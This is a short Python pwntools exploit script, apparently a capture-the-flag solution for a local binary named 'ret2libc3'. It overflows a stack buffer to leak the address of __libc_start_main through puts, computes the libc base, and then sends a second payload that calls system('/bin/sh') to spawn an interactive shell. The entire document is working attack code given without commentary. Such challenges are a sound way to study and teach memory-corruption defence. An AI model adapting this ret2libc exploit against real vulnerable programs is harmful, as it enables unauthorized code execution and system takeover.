from pwn import *

sh = process('./ret2libc3')

elf_ret2libc3 = ELF('./ret2libc3')
elf_libc = ELF('/lib/i386-linux-gnu/libc.so.6')

puts_plt = elf_ret2libc3.plt['puts']
libc_start_main_got = elf_ret2libc3.got['__libc_start_main']
start_addr = elf_ret2libc3.symbols['_start']
offset = 0x6c + 4

payload = b'A'*offset + p32(puts_plt) + p32(start_addr) + p32(libc_start_main_got)
sh.sendlineafter(b'Can you find it !?', payload)

libc_start_main_addr = u32(sh.recv()[0:4])
print("libc start main addr: " + hex(libc_start_main_addr))

libc_base = libc_start_main_addr - elf_libc.symbols['__libc_start_main']
print("libc base: " + hex(libc_base))

system_addr = libc_base + elf_libc.symbols['system']
binsh_addr = libc_base + next(elf_libc.search(b'/bin/sh'))

payload = b'A'*offset + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
sh.sendline(payload)

sh.interactive()
